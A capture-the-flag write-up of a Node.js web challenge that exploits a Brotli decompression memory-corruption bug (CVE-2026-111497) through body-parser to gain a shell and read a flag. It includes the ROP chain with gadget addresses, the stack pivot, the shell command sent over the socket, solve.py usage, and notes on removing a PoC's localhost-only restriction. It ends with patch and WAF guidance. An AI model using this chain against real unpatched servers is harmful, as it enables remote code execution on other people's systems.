# Shelloween — HTTP2Shell / CVE-2026-111497

**Flag:** `ccsCTF{fake_flag}`
**Target:** `http://100.121.79.48:32001/`
**Category:** web · **Tag:** insane
**Runtime:** Node.js v24.22.0 (linux/x64, non-PIE) · Express 5.3.0 · body-parser 2.4.0

```sh
$ python3 solve.py --mode shell
[+] target healthy
[*] attempt 1/40  path=/bin/sh  dup2 fd=0
    no success (got 248 bytes): HTTP/1.1 400 Bad Request ...
[*] attempt 2/40  path=/bin/sh  dup2 fd=0
    no success (got 0 bytes)
[*] attempt 3/40  path=/bin/sh  dup2 fd=0
[+] FLAG
    ccsCTF{fake_flag}
```

---

## 1. Summary

A malformed Brotli stream triggers an out-of-bounds write in the Brotli
reference decoder bundled inside Node.js 24.22.0. The write lands on a
saved return address inside the libuv worker, which we overwrite with an
11-gadget ROP chain. The chain wires the exploited HTTP socket onto
stdin, `execvp()`s a NULL-argv `/bin/sh`, and the shell reads `/flag.txt`
back over the same connection.

The interesting part is not the memory corruption — it is the *budget*.
The ROP chain has exactly **11 qwords** of room, and every one of them is
spoken for. Getting a shell out of a single `dup2` is the actual puzzle.

---

## 2. Attack surface

The challenge is a "Shell Market" storefront. Nothing in the app looks
wrong: JSON in, JSON out, no `eval`, no template injection, no auth to
bypass.

```js
// src/backend/app.js
app.use(express.json());
app.use(express.static(publicDir));
```

The bug is one layer down. `express.json()` → body-parser → `read()`:

```js
// node_modules/body-parser/lib/read.js:214
function createDecompressionStream (encoding, debug) {
  switch (encoding) {
    case 'deflate': return zlib.createInflate()
    case 'gzip':    return zlib.createGunzip()
    case 'br':      return zlib.createBrotliDecompress()   // <-- vulnerable
    ...
```

body-parser defaults to `inflate: true`, so **any** request carrying
`Content-Encoding: br` is fed to `zlib.createBrotliDecompress()` — which
is the bundled Brotli reference decoder. The middleware runs before
routing, so the path is live on every route including 404s.

Recon confirmed the version was never patched:

```sh
$ curl -s http://100.121.79.48:32001/health
{"status":"ok"}
$ ssh nowsh@100.121.79.48
$ docker exec shelloween-chall-1 sha256sum /usr/local/bin/node
67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c   # v24.22.0, vulnerable
```

---

## 3. Root cause

`DecodeBlockTypeAndLength()` returned a `BROTLI_BOOL` for two mutually
exclusive conditions:

```c
static BROTLI_INLINE BROTLI_BOOL DecodeBlockTypeAndLength(int safe, ...) {
  brotli_reg_t max_block_type = s->num_block_types[tree_type];
  if (max_block_type <= 1) {
    return BROTLI_FALSE;        /* permanent FORMAT error ... */
  }
  ...
  if (!SafeReadSymbol(...)) return BROTLI_FALSE;   /* ... and temporary NEEDS_MORE_INPUT */
}
```

A stream that declares **one** block type but then forces a block switch
exhausts `block_length` and hits that first branch. The failure is
indistinguishable from "send me more bytes".

The fast path throws the return value away entirely:

```c
#define BROTLI_SAFE(METHOD)                  \
  { if (safe) { if (!Safe##METHOD) { result = NEEDS_MORE_INPUT; goto ...; } } \
    else { METHOD; } }                       /* <-- result discarded */
```

So the decoder keeps running on stale block state, the LZ77 back-reference
computes an invalid distance, and `s->ringbuffer[pos]` is written outside
the allocation.

**Patch** — [google/brotli `0ed4268`](https://github.com/google/brotli/commit/0ed4268a4401abcb4472096340477cf4af7d1a2b)
("Detect and report invalid stream earlier"):

1. New error code: `BROTLI_ERROR_CODE(_ERROR_FORMAT_, BLOCK_SWITCH, -17)`
2. `DecodeBlockTypeAndLength()` return type → `BrotliDecoderErrorCode`
3. `BROTLI_SAFE` → `BROTLI_SAFE_WITH_STATUS`, so *any* non-SUCCESS aborts

Shipped as Node **24.22.1** / 22.23.4 / 26.12.1.

---

## 4. Turning a crash into a pivot

Two stages, sent as a chunked `Content-Encoding: br` body:

* **Stage 1** — a huge Brotli metablock carrying a 1031-byte *uncompressed
  prefix* we fully control, followed by the malformed block-switch tail.
* **Stage 2** — a 256-byte fragment that forces the block switch, firing
  the OOB write with a chosen position.

The prefix is copied over the worker's stack. We lay a **stack pivot** at
`copy_source_offset = 0x367`, which is exactly where the saved return
address lands:

```
0x816750:  mov  %rdi,%rax          ; rax = rdi
0x1fb97f8: lea  0x30(%rax),%rsp    ; rsp = rdi + 0x30
           repz ret
```

`rdi` at that moment equals `buffer + 0x367`, so `rsp` lands on our chain
at `source + 0x30`.

---

## 5. The register contract

Everything hinges on where `execvp` gets its arguments. The profile
pins `execvp_call_site = 0x1a3ebec` — inside `uv_spawn`:

```asm
1a3ebec:  mov  0x10(%rbx),%rsi     ; argv = *(rbx + 0x10)
1a3ebf0:  mov  0x8(%rbx),%rdi      ; file = *(rbx + 0x08)
1a3ebf4:  call 74cd70 <execvp@plt>
```

So we must set `rbx` and populate two pointers at `rbx+8` and `rbx+0x10`.
The store gadget does the first one:

```asm
0x8bd991:  add  $0x88,%rdi         ; rdi = buffer + source + 0x88
           xor  %eax,%eax
           mov  %rdi,(%rsi)        ; *rsi = rdi
           ret
```

With `rsi = bss+8`, this writes the **path pointer** to `*(bss+0x08)`, and
the path string lives at `source + 0x88` — precisely `rdi + 0x88`.

> **`*(bss+0x10)` — argv — is never written.**
>
> `bss_base = 0x6bdfb00` sits in zero-initialised `.bss` just below
> `_end = 0x6bdfb88`, so `argv` evaluates to **NULL**.

### Does `execvp(file, NULL)` even work?

This decides the whole endgame, so I tested it against the exact base
image rather than trusting a guess:

```c
execvp("/usr/bin/id", (char *const *)0);   /* -> uid=0(root)... exit=0  WORKS */
execvp("/usr/bin/id", (char *const[]){0}); /* -> exit=0                 WORKS */
execvp("/bin/sh",     (char *const *)0);   /* -> reads stdin, runs commands  */
```

glibc tolerates a NULL argv, and a NULL-argv `/bin/sh` reads commands
from **fd 0**. That's the opening.

---

## 6. The 11-qword budget

The chain sits at `source + 0x30`; the path sits at `source + 0x88`. The
gap is `0x58` bytes — **exactly 11 qwords**, and the verified chain fills
it to the byte:

```python
chain = (
    POP_RSI_RET,        BSS_BASE + 8,   # rsi = bss + 8
    STORE_RDI_PLUS_88,                  # *(bss+8) = rdi + 0x88  -> path
    POP_RBX_RET,        BSS_BASE,       # rbx = bss
    POP_RDI_RET,        SOCKET_FD,      # rdi = 19
    POP_RSI_RET,        DUP_FD,         # rsi = 0 | 1
    DUP2_PLT,                           # dup2(19, DUP_FD)
    EXECVP_CALL_SITE,                   # execvp(*(bss+8), *(bss+0x10))
)
```

There is **no room for a second `dup2`** — adding one overwrites the path
string, because the path offset is fixed at `rdi + 0x88` and `rdi` is
fixed by the pivot. Any attempt to widen the chain corrupts either the
pivot, the chain, or the path.

So we get exactly **one** of `{stdin, stdout}` on the socket.

---

## 7. The trick: wire up stdin, let the shell fix stdout

We can't have both — but the shell can do the second redirect *itself*.

| | `dup2(19, 1)` | `dup2(19, 0)` |
|---|---|---|
| stdout | socket | container logs |
| stdin | `/dev/null` | **socket** |
| `exec /bin/sh` | shell reads EOF, exits instantly | shell reads our commands ✅ |

Measured on the live target — note `fd 0 -> /dev/null`, which is exactly
why stdin has to be redirected:

```
at rest:  0->/dev/null  1->pipe  ...  18->socket:[24998]
during:   ... 19->socket:[38579]        ← the accepted connection
after:    19 gone
```

So:

1. `dup2(19, 0)` → our socket becomes the shell's stdin
2. `execvp("/bin/sh", NULL)` → shell starts, blocking on fd 0
3. We send:

```
exec >&0; cat /flag.txt; echo __SOLVE_DONE__
```

`exec >&0` promotes fd 0 (the socket) onto fd 1, so everything after it
comes back to us. One `dup2` was enough — we just made the shell perform
the other half.

### Why not `/usr/bin/id` directly?

`id` writes to stdout, so it needs `dup2(19, 1)` — proving RCE but
yielding no flag. `solve.py --mode id` does exactly that as a
reconnaissance primitive:

```console
$ python3 solve.py --mode id --attempts 16
[+] RCE confirmed
    uid=1000(node) gid=1000(node)
```

---

## 8. Probabilistic exploitation

The stage-2 `position` is a guess at an ASLR'd heap address
(`0x137ed748`), so each attempt is independent and roughly 1-in-10 to
1-in-4. A miss crashes the worker.

The Dockerfile's supervisor makes that recoverable — and it is *required*,
not a convenience:

```dockerfile
CMD ["sh", "-c", "while true; do node index.js; sleep 0.1; done"]
```

Between attempts `solve.py` fires the plain DoS trigger (verified by
`sha256` of the generated stream) to kill the current worker, then waits
for `/health` to come back. Each respawn re-rolls ASLR.

Observed: `id` mode succeeded on attempt **16**, shell mode on attempt
**3**. Total runtime for the flag: well under a minute.

---

## 9. What was verified, and how

Rather than trusting the published profile, each assumption was checked
against the live box:

| Assumption | How verified | Result |
|---|---|---|
| Vulnerable runtime | `sha256sum /usr/local/bin/node` | `67ca5783…6751c` = profile ✅ |
| Base image | `docker pull node:24.22.0-bookworm` | `sha256:925de64a…` = profile ✅ |
| Architecture | `uname -m` on target host | `x86_64` ✅ |
| `accepted_socket_fd = 19` | held a TCP conn, read `/proc/8/fd` | `19 -> socket:[38579]` ✅ |
| stdin is `/dev/null` | same listing | `0 -> /dev/null` ✅ |
| `dup2@plt = 0x74d7f0` | `objdump -d` on the image binary | matches ✅ |
| `execvp` arg contract | disassembled `0x1a3ebec` | `mov 0x10(%rbx),%rsi` ✅ |
| `store_rdi_plus_88` semantics | disassembled `0x8bd991` | `add $0x88,%rdi; mov %rdi,(%rsi)` ✅ |
| `execvp(path, NULL)` viable | compiled & ran against base image | works ✅ |

The published PoC refuses this outright — it hardcodes
`ALLOWED_TARGET_HOSTS = {127.0.0.1, ::1, localhost}` and its healthcheck
expects a `PONG\n` body that this app never sends. Both had to be
rewritten.

---

## 10. Remediation

**Patch.** Nothing else is a real fix.

```sh
# Node.js
22.23.4 · 24.22.1 · 26.12.1
# Bun          >= 1.4.4
# PyPI brotli  >= 1.2.1   (brotlicffi >= 1.2.1.0)
```

Interim, at the perimeter — reject or strip inbound Brotli request bodies
so they never reach `node:zlib`:

```nginx
if ($http_content_encoding = "br") { return 415; }
```

Note that this blocks *only* the inbound direction. The same decoder is
also reachable through **outbound** responses (`fetch`, `axios`, `got`,
`undici`, `node-fetch`) whenever the server consumes a Brotli-compressed
body from an attacker-controlled origin — that path needs the runtime
patch, not a WAF rule.

---

## 11. Files

| File | Purpose |
|---|---|
| `solve.py` | Self-contained exploit. Stdlib only, no dependencies. |
| `WRITEUP.md` | This document. |

```sh
python3 solve.py                          # default: read /flag.txt
python3 solve.py --url http://host:32001   # explicit target
python3 solve.py --mode id                 # prove RCE only (runs /usr/bin/id)
python3 solve.py --attempts 40             # more ASLR rolls
```

---

## References

- [Node.js October 2026 security release — CVE-2026-111497](https://nodejs.org/en/blog/vulnerability/october-2026-security-releases)
- [google/brotli fix `0ed4268`](https://github.com/google/brotli/commit/0ed4268a4401abcb4472096340477cf4af7d1a2b)
- [dimasma0305/CVE-2026-111497-POC](https://github.com/dimasma0305/CVE-2026-111497-POC) — original trigger and profile data
- [Hika-sec/http2shell-CVE-2026-111497](https://github.com/Hika-sec/http2shell-CVE-2026-111497) — multi-runtime lab

*Authorized testing only: this was run against a challenge instance on the
author's own infrastructure.*
